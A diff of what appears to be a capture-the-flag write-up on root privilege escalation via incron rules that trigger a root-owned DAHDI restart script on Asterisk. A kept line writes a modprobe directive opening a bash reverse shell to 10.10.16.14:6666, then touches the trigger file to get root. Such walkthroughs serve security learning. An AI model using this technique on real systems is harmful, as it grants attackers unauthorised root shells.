@@ -27,8 +27,9 @@ Now for privesc, we must look at the contents of /etc/incron.d/legacy
 /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
 /usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
 ```
-These are all incron instructions. They are watching the files on the right. IN_COLE_WRITE means that whn the file on the left is modifyied/updated incron'll trigger the file on the right.
-DAHDI (Digium/Asterisk Hardware Device Interface) is the Linux subsystem used by Asterisk to interact with telephony hardware and timing resources, and in many cases it requires root for running, it's worth exploring.
+These are all incron instructions. They are watching the files on the left. IN_COLE_WRITE means that whn the file on the left is modifyied/updated incron'll trigger the file on the right. The trick here is /usr/sbin/sysadmin_dahdi_restart is owned by root and root is the only one that can execute it. Anything that comes from this is goin to be from a superuser.
+<img width="771" height="105" alt="image" src="https://github.com/user-attachments/assets/34a4a126-a251-486f-84c4-3d100d83bc5e" />
+
 Now let's read this file here: /usr/sbin/sysadmin_dahdi_restart
 ```bash
 cat /usr/sbin/sysadmin_dahdi_restart
@@ -80,10 +81,11 @@ echo "install dahdi /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.14/6666 0>&1'" > 
 
 touch /var/spool/asterisk/sysadmin/dahdi_restart
 ```
+
 And get root:
 <img width="747" height="725" alt="image" src="https://github.com/user-attachments/assets/538eb842-a9b2-47f7-9744-9aa1acab291b" />
 
-
+This only worked because we had permissions write permissions over /var/spool/asterisk/sysadmin/dahdi_restart so we could touch it. Remeber, touch changes metadada like timestamps.
 
 
 
